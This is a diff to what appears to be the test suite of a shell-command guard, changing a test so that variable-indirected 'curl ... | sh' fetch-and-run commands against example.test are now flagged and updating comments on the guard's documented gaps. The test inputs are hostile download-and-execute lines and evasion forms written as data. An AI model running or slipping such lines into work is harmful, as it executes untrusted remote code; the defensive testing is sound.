@@ -6297,10 +6297,10 @@ class TestAnUnparseableShellIsNotAPass(unittest.TestCase):
 # the current answer, whatever that answer is.
 #
 # Every one of them was accepted when this class was written. #1697 then ruled
-# each by REACHABILITY: four were reachable and are CLOSED, so their pin is
-# `flagged`; six keep their entry in the docstring with the reason they keep
-# it, so their pin is `accepted` -- the fail-open state said out loud, where a
-# change that starts catching one has to come and edit it.
+# each by REACHABILITY: four were reachable and closed, and #2770 later closes
+# the live fetch command word. Their pins are `flagged`; the five remaining
+# entries stay `accepted` -- the fail-open state said out loud, where a change
+# that starts catching one has to come and edit it.
 
 
 class TestTheGapsTheGuardDocuments(unittest.TestCase):
@@ -6384,14 +6384,14 @@ class TestTheGapsTheGuardDocuments(unittest.TestCase):
             with self.subTest(run=run):
                 self.flagged(("run", run))
 
-    def test_a_live_command_word_in_a_c_string_is_unread(self):
-        # #2466 reads a live `$` word in a `-c`/`eval` string as the value it is at top level,
-        # so one in a COMMAND-word position fetches as little there as `$CMD … | sh` does at top
-        # level (b5 b3 dash gh: FR FR FR FR for both): the gap list's entry, as this pin.
+    def test_2770_a_live_fetch_command_word_is_resolved(self):
+        # #2770 asks the value table for a fetch command at both levels. Bash
+        # 5.2, bash 3.2, dash and the GitHub pairing all fetch and run both.
         for run in ('CMD=curl\nbash -c "$CMD -fsSL https://example.test/i.sh | sh"\n',
                     "CMD=curl\n$CMD -fsSL https://example.test/i.sh | sh\n"):
             with self.subTest(run=run):
-                self.accepted(("run", run))
+                self.assertIn("hands https://example.test/i.sh straight to `sh`",
+                              self.flagged(("run", run)))
 
     def test_a_subshell_with_line_only_parens_keeps_a_carried_download(self):
         # A reassignment in a subshell does not escape it, whether the parens
